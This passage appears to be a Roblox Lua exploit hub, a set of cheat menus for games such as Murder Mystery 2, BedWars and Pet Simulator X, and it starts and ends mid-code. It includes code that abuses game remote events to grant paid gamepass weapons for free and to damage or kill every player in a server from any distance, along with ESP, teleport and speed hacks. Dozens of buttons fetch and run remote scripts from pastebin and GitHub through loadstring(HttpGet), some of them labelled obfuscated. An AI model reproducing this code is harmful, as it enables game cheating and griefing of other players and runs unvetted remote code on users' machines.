TextButton_3.MouseButton1Down:Connect(function()
if not _G.IgnoreList then
    _G.IgnoreList = {}
end

local function Create(Object, Properties)
	local New = Instance.new(Object)
	for i,v in pairs(Properties) do
		New[i] = v
	end
	return New
end

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local Gui = Create("ScreenGui",{Name="Peacemaker",ResetOnSpawn=false,Parent=Player.PlayerGui})
local Frame = Create("Frame",{Parent=Gui,Position = UDim2.new(0.4,0,0.4,0),Size=UDim2.new(0.2,0,0.2,0),BackgroundTransparency=0.6,BorderSizePixel=0,BackgroundColor3=Color3.new(1,1,1),ZIndex=10})
local Title = Create("TextLabel",{Parent=Frame,Position=UDim2.new(0.3,0,-0.15,-1),Size=UDim2.new(0.4,0,0.15,0),Font=Enum.Font.Oswald,Text="PEACEMAKER",BorderSizePixel=3,TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),ZIndex=11})
local OutlineU = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.01,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=11})
local OutlineD = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,1,0),Size=UDim2.new(1,0,0.01,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=11})
local OutlineL = Create("Frame",{Parent=Frame,Position = UDim2.new(0,0,0,0),Size=UDim2.new(0.005,0,1,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=11})
local OutlineR = Create("Frame",{Parent=Frame,Position = UDim2.new(1,0,0,0),Size=UDim2.new(0.005,0,1,0),BackgroundTransparency=0,BorderSizePixel=0,BackgroundColor3=Color3.new(0,0,0),ZIndex=11})
local Note = Create("TextLabel",{Parent=Frame,Position=UDim2.new(0,0,0.9,0),Size=UDim2.new(1,0,0.1,0),Font=Enum.Font.Oswald,Text="Made by Crokuran",BorderSizePixel=3,BackgroundTransparency=1,TextScaled=true,TextWrapped=true,TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,ZIndex=11})

local ToolsText = Create("TextLabel",{Parent=Frame,Position=UDim2.new(0.05,0,0.05,0),Size=UDim2.new(0.3,0,0.2,0),BackgroundTransparency=1,Font=Enum.Font.Oswald,Text="Tools",TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,TextScaled=true,TextWrapped=true,ZIndex=11})
local WeaponsText = Create("TextLabel",{Parent=Frame,Position=UDim2.new(0.6,0,0.05,0),Size=UDim2.new(0.3,0,0.2,0),BackgroundTransparency=1,Font=Enum.Font.Oswald,Text="Weapons",TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,TextScaled=true,TextWrapped=true,ZIndex=11})
local InfoText = Create("TextLabel",{Parent=Gui,Position=UDim2.new(0,0,0,0),Size=UDim2.new(0.1,0,0.1,0),BackgroundTransparency=0,BackgroundColor3=Color3.new(0,0,0),Font=Enum.Font.Oswald,Text="Weapons",TextColor3=Color3.new(1,1,1),TextStrokeTransparency=0,TextScaled=true,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Top,Visible=false,ZIndex=15})

local GiveGS = Create("TextButton",{Name="GiveGS",Parent=Frame,Position=UDim2.new(0.05,0,0.3,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Emerald Greatsword",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})
local GiveBD = Create("TextButton",{Name="GiveBD",Parent=Frame,Position=UDim2.new(0.05,0,0.5,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Blood Dagger",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})
local SpamTools = Create("TextButton",{Name="SpamTools",Parent=Frame,Position=UDim2.new(0.05,0,0.7,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Spam Tools",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})
local KillNear = Create("TextButton",{Name="KillNear",Parent=Frame,Position=UDim2.new(0.6,0,0.3,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Kill Nearest",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})
local SpamGrenades = Create("TextButton",{Name="SpamGrenades",Parent=Frame,Position=UDim2.new(0.6,0,0.5,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Spam Grenades",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})
local FastKill = Create("TextButton",{Name="FastKill",Parent=Frame,Position=UDim2.new(0.6,0,0.7,0),Size=UDim2.new(0.3,0,0.15,0),Font=Enum.Font.Oswald,Text="Fast Kill All",TextScaled=true,TextWrapped=true,BackgroundColor3=Color3.new(1,1,1),BorderSizePixel=2,ZIndex=11})

local ButtonInfo = {
    GiveGS = "Gives gamepass Emerald Greatsword weapon for free",
    GiveBD = "Gives gamepass Blood Dagger weapon for free",
    SpamTools = "Rapidly gives you multiple tools, use when combined with Spam Grenades",
    KillNear = "WHILE HOLDING OUT A WEAPON, damages the closest player from any distance",
    SpamGrenades = "Automatically throws grenades incredibly fast, use with Spam Tools to refresh grenades",
    FastKill = "Uses all weapons to kill everybody in the server. Give yourself more tools for faster killing"
}

local function GetChar()
    local Char = Player.Character or Player.CharacterAdded:Wait()
    return Char
end

local DragSpeed = .3
local FrameStart
local MouseStart
local HeldDown = false
Title.InputBegan:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton1 then
		HeldDown = true
		FrameStart = Frame.Position
		MouseStart = Input.Position
		repeat
			Frame.Position = Frame.Position:Lerp(UDim2.new(FrameStart.X.Scale,FrameStart.X.Offset + (Mouse.X - MouseStart.X),FrameStart.Y.Scale,FrameStart.Y.Offset + (Mouse.Y - MouseStart.Y)), DragSpeed)
			game:GetService("RunService").RenderStepped:Wait()
		until not HeldDown
		local EndPos = {X = Mouse.X, Y = Mouse.Y}
		for i=1,50 do
			if not HeldDown then
				Frame.Position = Frame.Position:Lerp(UDim2.new(FrameStart.X.Scale,FrameStart.X.Offset + (EndPos.X - MouseStart.X),FrameStart.Y.Scale,FrameStart.Y.Offset + (EndPos.Y - MouseStart.Y)), DragSpeed)
			else
				break
			end
			game:GetService("RunService").RenderStepped:Wait()
		end
	end
end)

Title.InputEnded:Connect(function(Input)
	if Input.UserInputType == Enum.UserInputType.MouseButton1 then
		HeldDown = false
	end
end)

GiveGS.MouseButton1Click:Connect(function()
    if Player.Character:FindFirstChild("Loaded") then Player.Character.Loaded:Destroy() end
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Emerald Greatsword")
end)

GiveBD.MouseButton1Click:Connect(function()
    if Player.Character:FindFirstChild("Loaded") then Player.Character.Loaded:Destroy() end
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Blood Dagger")
end)

local Spamming = false
SpamTools.MouseButton1Click:Connect(function()
    if Spamming then
        Spamming = false
        SpamTools.BackgroundColor3 = Color3.new(1,1,1)
    else
        SpamTools.BackgroundColor3 = Color3.new(0,1,0)
        Spamming = true
        repeat
            if GetChar():FindFirstChild("Loaded") then
                GetChar().Loaded:Destroy()
            end
            Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer("Pencil")
            game:GetService("RunService").Heartbeat:Wait()
        until not Spamming
    end
end)

local KillingNear = false
KillNear.MouseButton1Click:Connect(function()
    if KillingNear then
        KillingNear = false
        KillNear.BackgroundColor3 = Color3.new(1,1,1)
    else
        KillNear.BackgroundColor3 = Color3.new(0,1,0)
        KillingNear = true
        repeat
            local targ
            local range = 10000
            for i,v in pairs(workspace:GetChildren()) do
                if v~=GetChar() and not table.find(_G.IgnoreList,v.Name) then
                    local vhum = v:FindFirstChild("Humanoid")
                    local vroot = v:FindFirstChild("HumanoidRootPart")
                    if vhum and vroot then
                        local dist = (vroot.Position - Player.Character.HumanoidRootPart.Position).magnitude
                        if vhum.Health>0 and not v:FindFirstChild("ForceField") and dist <= range then
                            targ = vhum
                            range = dist
                        end
                    end
                end
            end
            
            if targ then
                local tool = GetChar():FindFirstChildOfClass("Tool")
                tool.DamageRemote:FireServer(targ)
            end
            wait()
        until not KillingNear
    end
end)

local Grenading = false
SpamGrenades.MouseButton1Click:Connect(function()
    if Grenading then
        Grenading = false
        SpamGrenades.BackgroundColor3 = Color3.new(1,1,1)
    else
        SpamGrenades.BackgroundColor3 = Color3.new(0,1,0)
        Grenading = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v.Name == "Grenade" then
                    GetChar().Humanoid:EquipTool(v)
                    v:Activate()
                    for i=1,5 do
                        game:GetService("RunService").Heartbeat:Wait()
                    end
                    if not Grenading then
                        break
                    end
                end
            end
            game:GetService("RunService").Heartbeat:Wait()
        until not Grenading
    end
end)

local FastKilling = false
FastKill.MouseButton1Click:Connect(function()
    if FastKilling then
        FastKilling = false
        FastKill.BackgroundColor3 = Color3.new(1,1,1)
    else
        FastKill.BackgroundColor3 = Color3.new(0,1,0)
        FastKilling = true
        repeat
            for i,v in pairs(Player.Backpack:GetChildren()) do
                if v:FindFirstChild("DamageRemote") then
                    GetChar().Humanoid:EquipTool(v)
                    
                    local targ
                    local range = 10000
                    for i,v in pairs(workspace:GetChildren()) do
                        if v~=GetChar() and not table.find(_G.IgnoreList,v.Name) then
                            local vhum = v:FindFirstChild("Humanoid")
                            local vroot = v:FindFirstChild("HumanoidRootPart")
                            if vhum and vroot then
                                local dist = (vroot.Position - Player.Character.HumanoidRootPart.Position).magnitude
                                if vhum.Health>0 and not v:FindFirstChild("ForceField") and dist <= range then
                                    targ = vhum
                                    range = dist
                                end
                            end
                        end
                    end
                    
                    for i=1,2 do
                        game:GetService("RunService").Heartbeat:Wait()
                    end
                    
                    if targ then
                        v.DamageRemote:FireServer(targ)
                    end
                    
                    if not FastKilling then
                        break
                    end
                end
            end
            wait()
        until not FastKilling
    end
end)

for name,info in pairs(ButtonInfo) do
    local button = Frame[name]
    button.MouseEnter:Connect(function()
    	local left = false
    	local con = button.MouseLeave:Connect(function()
    		left = true
    	end)
    	
    	InfoText.Visible = true
    	InfoText.Text = info
    	
    	repeat
    		game:GetService("RunService").RenderStepped:Wait()
    		InfoText.Position = UDim2.new(0,Mouse.X+5,0,Mouse.Y+5)
    	until left
    	InfoText.Visible = false
    	con:Disconnect()
    end)
end
end)

UICorner_5.Parent = TextButton_3

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_4.Position = UDim2.new(0.690104127, 0, 0.340336144, 0)
TextButton_4.Size = UDim2.new(0, 107, 0, 26)
TextButton_4.Font = Enum.Font.Bangers
TextButton_4.Text = "New Script Update"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000
TextButton_4.MouseButton1Down:Connect(function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/1111-ssss/Chaos_Script/main/Chaos_script.txt'))()
end)

UICorner_6.Parent = TextButton_4

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_5.Position = UDim2.new(0.361979127, 0, 0.340336144, 0)
TextButton_5.Size = UDim2.new(0, 107, 0, 26)
TextButton_5.Font = Enum.Font.Bangers
TextButton_5.Text = "Script name"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Down:Connect(function()

end)

UICorner_7.Parent = TextButton_5

TextButton_6.Parent = Frame
TextButton_6.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_6.Position = UDim2.new(0.0182291269, 0, 0.340336144, 0)
TextButton_6.Size = UDim2.new(0, 107, 0, 26)
TextButton_6.Font = Enum.Font.Bangers
TextButton_6.Text = "Script name"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Down:Connect(function()

end)

UICorner_8.Parent = TextButton_6

TextButton_7.Parent = Frame
TextButton_7.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_7.Position = UDim2.new(0.0182291269, 0, 0.50420171, 0)
TextButton_7.Size = UDim2.new(0, 107, 0, 26)
TextButton_7.Font = Enum.Font.Bangers
TextButton_7.Text = "Script name"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 14.000
TextButton_7.MouseButton1Down:Connect(function()

end)

UICorner_9.Parent = TextButton_7

TextButton_8.Parent = Frame
TextButton_8.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_8.Position = UDim2.new(0.35937497, 0, 0.50420171, 0)
TextButton_8.Size = UDim2.new(0, 107, 0, 26)
TextButton_8.Font = Enum.Font.Bangers
TextButton_8.Text = "Script name"
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextSize = 14.000
TextButton_8.MouseButton1Down:Connect(function()

end)

UICorner_10.Parent = TextButton_8

TextButton_9.Parent = Frame
TextButton_9.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_9.Position = UDim2.new(0.690104127, 0, 0.50420171, 0)
TextButton_9.Size = UDim2.new(0, 107, 0, 26)
TextButton_9.Font = Enum.Font.Bangers
TextButton_9.Text = "Script name"
TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.TextSize = 14.000
TextButton_9.MouseButton1Down:Connect(function()

end)

UICorner_11.Parent = TextButton_9

TextButton_10.Parent = Frame
TextButton_10.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_10.Position = UDim2.new(0.690104127, 0, 0.680672288, 0)
TextButton_10.Size = UDim2.new(0, 107, 0, 26)
TextButton_10.Font = Enum.Font.Bangers
TextButton_10.Text = "Script name"
TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.TextSize = 14.000
TextButton_10.MouseButton1Down:Connect(function()

end)

UICorner_12.Parent = TextButton_10

TextButton_11.Parent = Frame
TextButton_11.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_11.Position = UDim2.new(0.361979127, 0, 0.680672288, 0)
TextButton_11.Size = UDim2.new(0, 107, 0, 26)
TextButton_11.Font = Enum.Font.Bangers
TextButton_11.Text = "Script name"
TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.TextSize = 14.000
TextButton_11.MouseButton1Down:Connect(function()

end)

UICorner_13.Parent = TextButton_11

TextButton_12.Parent = Frame
TextButton_12.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
TextButton_12.Position = UDim2.new(0.0156249702, 0, 0.680672288, 0)
TextButton_12.Size = UDim2.new(0, 107, 0, 26)
TextButton_12.Font = Enum.Font.Bangers
TextButton_12.Text = "Script name"
TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.TextSize = 14.000
TextButton_12.MouseButton1Down:Connect(function()

end)

UICorner_14.Parent = TextButton_12

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
TextLabel_2.Position = UDim2.new(0, 0, 0.857142866, 0)
TextLabel_2.Size = UDim2.new(0, 384, 0, 34)
TextLabel_2.Font = Enum.Font.Bangers
TextLabel_2.Text = "Credits To GamerZ"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 28.000
TextLabel_2.TextStrokeColor3 = Color3.fromRGB(38, 136, 54)
TextLabel_2.TextStrokeTransparency = 0.850
TextLabel_2.TextWrapped = true

UICorner_15.Parent = TextLabel_20
end)




local Section = Tab:NewSection("Cant say the word")
Section:NewButton("Dont say the word Gui 1 ", "", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/W9KKeaMp'),true))()
end)
Section:NewButton("Dont say the word Gui 1 ", "", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/CantSayTheWordScript/main/fe")))()
end)


Section:NewButton("Dont say the word Gui 1 ", "ok", function()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Cant Say the Word GUI", "Serpent")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")
Section:NewButton("Word Remover", "Makes it to where you can say your word.", function()
    game:GetService("Players").LocalPlayer.cantSay.Value ="211b296b9c994586bd64390b997ae533"
end)

local Tab = Window:NewTab("Badges")
local Section = Tab:NewSection("Obbys")
Section:NewButton("Finish Easy Obby", "Finishes the Easy obby", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13.4943476, -86.5290451, 77.6385956, -1, 1.78168662e-08, -8.78237279e-06, 1.78170527e-08, 1, -2.12067377e-08, 8.78237279e-06, -2.1206894e-08, -1)
end)
Section:NewButton("Finish Medium Obby", "Finishes the Medium obby", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-53.3725204, -86.5290451, 108.624664, -0.999961972, 8.6029651e-08, 0.0087191863, 8.54467146e-08, 1, -6.72292302e-08, -0.0087191863, -6.6481654e-08, -0.999961972)
end)
Section:NewButton("Finish Hard Obby", "Finishes the Hard obby", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-93.1392822, -84.6111679, 220.999039, -0.999847829, 3.67107553e-08, 0.0174433589, 3.57647956e-08, 1, -5.45423333e-08, -0.0174433589, -5.39101741e-08, -0.999847829)
end)
Section:NewButton("Teleport to end of spiral stairs", "tps to the end of spiral stairs", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-121.38726, 183.528992, 5.08279037, 0.0784535259, 1.28655371e-08, -0.996917784, -3.20174074e-08, 1, 1.03856692e-08, 0.996917784, 3.11039301e-08, 0.0784535259)
end)

local Tab = Window:NewTab("Misc")
local Section = Tab:NewSection("Misc")
Section:NewSlider("Walkspeed", "Changes Walkspeed", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewSlider("Jump Power", "Changes Jump Power",  500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

local Tab = Window:NewTab("Credit")
local Section = Tab:NewSection("Credits")
Section:NewLabel("Credits to Kavo for the UI Library")
Section:NewLabel("Join the Discord: https://discord.gg/f26Vp8CzaZ")
Section:NewLabel("3wnd#8995")
end)



local Section = Tab:NewSection("Nico NextBot")
Section:NewButton("Nico NextBot Gui 1 ", "Cool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/HPHub/main/HPHub.lua"))()
end)
Section:NewButton("Nico NextBot Gui 2 ", "Cool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dropouut/Shindai/main/wercT.lua"))()
end)
Section:NewButton("Nico NextBot Gui 3 ", "Cool", function()
loadstring(game:HttpGet("https://pastebin.com/raw/DFfKb4i9"))()
end)

Section:NewButton("Nico NextBot Gui 4 ", "Cool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
end)
Section:NewButton("Nico NextBot Gui 5 ", "ok lol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/NicoNextBots", true))()
end)
Section:NewButton("Nico NextBot Gui 6 ", "idk this game", function()
local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
local w = library:CreateWindow("Nicos sexbots")
local b = w:CreateFolder("Main functions")
local c = w:CreateFolder("Misc")
b:Button("Monster Esp",function()
   esp()
end)
b:Button("Safe Zone #1",function()
   teleport1()
end)
b:Button("Safe Zone #2",function()
   teleport2()
end)
c:Button("is made by",function()
   print("is made by")
end)
c:Button("FireIsTheBest",function()
   print("FireIsTheBest - V3rm")
end)

c:Button("Discord in devcon",function()
   print("DawgZalensky#7579")
end)
c:DestroyGui()

function esp()
  while task.wait(15) do
     for __,v in pairs(game:GetService("Workspace").bots:GetDescendants()) do
      if v:IsA("Model") then
        local a = Instance.new("BillboardGui",v)
        a.Name = "Sex"
        a.Size = UDim2.new(7,0,7,0)
        a.AlwaysOnTop = true
        a.MaxDistance = 250
        local b = Instance.new("Frame",a)
        b.Size = UDim2.new(1,0, 1,0)
        b.BackgroundTransparency = 0.80
        b.BorderSizePixel = 0
        b.BackgroundColor3 = Color3.new(0, 0, 0)
        local c = Instance.new('TextLabel',b)
        c.Size = UDim2.new(2,0,2,0)
        c.BorderSizePixel = 0
        c.TextSize = 15
        c.Text = v.Name
        c.BackgroundTransparency = 1
      end
     end
  end
end

function teleport1()
  local daddy = game.Players.LocalPlayer.Character.HumanoidRootPart
  local griddy = CFrame.new(Vector3.new(-70, 35, 362))
  daddy.CFrame = griddy
end

function teleport2()
  local minions = game.Players.LocalPlayer.Character.HumanoidRootPart
  local riseofgru = CFrame.new(Vector3.new(-96, 19, -18))
  minions.CFrame = riseofgru
end
end)


local Section = Tab:NewSection("Rol Ghoul")
Section:NewButton("Rol Ghoul Gui 1 ", "Ohh", function()
loadstring(game:HttpGet('https://pastebin.com/raw/2uF3iQAf', true))()
end)
Section:NewButton("Rol Ghoul Gui 2 ", "Ohh", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/z4gs/scripts/master/Ro-Ghoul%20Auto%20Farm.lua"))()
end)
Section:NewButton("Rol Ghoul Gui 3 ", "Ohh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JRL-lav/Scripts/main/Ro-ghoul"))()
end)

Section:NewButton("Rol Ghoul Gui 4 ", "idk what to say lol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
end)

Section:NewButton("Rol Ghoul Gui 5 ", "Ohh", function()
loadstring(game:HttpGet(("https://aizen.ml/weis/RoGhoul.lua")))()
end)




local Section = Tab:NewSection("Pet Simulator X")
Section:NewButton("PetSimX GUI 1 ", "", function()
loadstring(game:HttpGetAsync("https://gitlab.com/Sky2836/test/-/raw/main/Mobile"))()
end)
Section:NewButton("PetSimX GUI 2 ", "", function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
end)
Section:NewButton("PetSimx GUI 3 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
end)
Section:NewButton("PetSimX GUI 4 ", "", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
end)
Section:NewButton("PetSimX GUI 5 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BadScripters/CloudHub/main/hub"))()
end)





local Section = Tab:NewSection("BedWars")

Section:NewButton("BedWar 1 ", "Bedwars GUI 1", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
end)

Section:NewButton("BedWars 2 ", "Bedwar 3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/bojoexploitz/yooo/main/itsobfuscated/InfinityHubTooOP", true))()
end)

Section:NewButton("BedWars 3 ", "Bedwars 3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/vodxn/sape/main/Initiate.lua"))()
end)

Section:NewButton("Bedwar 4 ", "Credit to Owner", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/joeengo/Future/main/loadstring.lua', true))()
end)

Section:NewButton("Bedwar 5 ", "Credit to Owner", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/8pmX8/moonlight.cool/main/mlobfuscated.lua'))();
end)

Section:NewButton("Bedwar 6 ", "Credit to Owner", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/JN-HH-Gaming-Future-Is-Good/main/Future%20Fixed"))()
end)

Section:NewButton("Bedwar 7 ", "Credit to the owner", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/bedwars/main/Script", true))()
end)





local Section = Tab:NewSection("BrookHaven")

Section:NewButton("BrookHaven 1 ", "ICEHUB GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)
Section:NewButton("BrookHaven Admin 2 ", "ICEHUB GUI", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/IceMael7/IceHubAdmin/main/IceHub'))()
end)








local Section = Tab:NewSection("Murder Mystery 2")
Section:NewButton("MM2 GUI 1 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
end)
Section:NewButton("MM2 GUI 2 ", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/DreadzHub2/DreadzHub-Scripts-FR/main/Loader"))()
end)
Section:NewButton("MM2 GUI 3 ", "", function()
loadstring(game:HttpGet("https://pastebin.com/raw/18Qrh2V7"))();
end)
Section:NewButton("MM2 GUI 4 ", "", function()
loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
end)
Section:NewButton("MM2 GUI 5 ", "", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))();
end)

Section:NewButton("MM2 1 ", "use keyboard for some ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
end)

Section:NewButton("MM2 2 ", "use keyboard for some ", function()
   loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

Section:NewButton("MM2 3 ", "use keyboard for some ", function()
local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow("Mm2Hub-Micro") -- Creates the window

local b = w:CreateFolder("Mm2Scripts") -- Creates the folder(U will put here your buttons,etc)

b:Label("Murder Mystery",{
    TextSize = 25; -- Self Explaining
    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
    
}) 

b:Button("Mm2 Script 1",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Drifter0507/scripts/main/mm2", true))()
end)

b:Button("Mm2 Script 2",function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel'),true))()
end)

b:Button("Mm2 Script 2",function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Neon-Fox/roblox-scripts/main/VynixuMM2"))()
end)

b:Toggle("Toggle",function(state)
    shared.toggle = state
    print("Toggled")
end)

b:Slider("Slider",{
    min = 10; -- min value of the slider
    max = 50; -- max value of the slider
    precise = true; -- max 2 decimals
},function(value)
    print(value)
end)

b:Dropdown("Dropdown",{"A","B","C"},true,function(mob) --true/false, replaces the current title "Dropdown" with the option that t
    print(mob)
end)

b:Bind("Bind",Enum.KeyCode.C,function() --Default bind
    print("Yes")
end)

b:ColorPicker("ColorPicker",Color3.fromRGB(255,0,0),function(color) --Default color
    print(color)
end)

b:Box("Box","number",function(value) -- "number" or "string"
    print(value)
end)

b:DestroyGui()

end)

Section:NewButton("MM2 GUI 4 ", "This is new", function()
   loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/16d946bfe0a0ed98a8e32de362fd4217/raw/0681fa979da042841f4e71a52490fdc3a2a16376/cac", true))()
end)

Section:NewButton("MM2 GUI 5 ", "This is new", function()
-- Gui to Lua
-- Version: 3

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ESPon = Instance.new("TextButton")
local ESPOff = Instance.new("TextButton")
local Bringgun = Instance.new("TextButton")
local ToMurderer = Instance.new("TextButton")
local ToLOBBY = Instance.new("TextButton")
local HIDE = Instance.new("TextButton")
local OPEN = Instance.new("TextButton")
local ToSherrif = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.Position = UDim2.new(0.166156977, 0, 0, 0)
Frame.Size = UDim2.new(0, 163, 0, 454)

ESPon.Name = "ESPon"
ESPon.Parent = ScreenGui
ESPon.BackgroundColor3 = Color3.new(0, 1, 0)
ESPon.Position = UDim2.new(0.166156977, 0, -4.41335142e-05, 0)
ESPon.Size = UDim2.new(0, 163, 0, 50)
ESPon.Font = Enum.Font.SourceSans
ESPon.Text = "ESP ON"
ESPon.TextColor3 = Color3.new(0, 0, 0)
ESPon.TextScaled = true
ESPon.TextSize = 14
ESPon.TextWrapped = true

ESPOff.Name = "ESPOff"
ESPOff.Parent = ScreenGui
ESPOff.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
ESPOff.Position = UDim2.new(0.166156977, 0, 0.105935514, 0)
ESPOff.Size = UDim2.new(0, 163, 0, 50)
ESPOff.Font = Enum.Font.SourceSans
ESPOff.Text = "ESP OFF"
ESPOff.TextColor3 = Color3.new(0, 0, 0)
ESPOff.TextScaled = true
ESPOff.TextSize = 14
ESPOff.TextWrapped = true

Bringgun.Name = "Bringgun"
Bringgun.Parent = ScreenGui
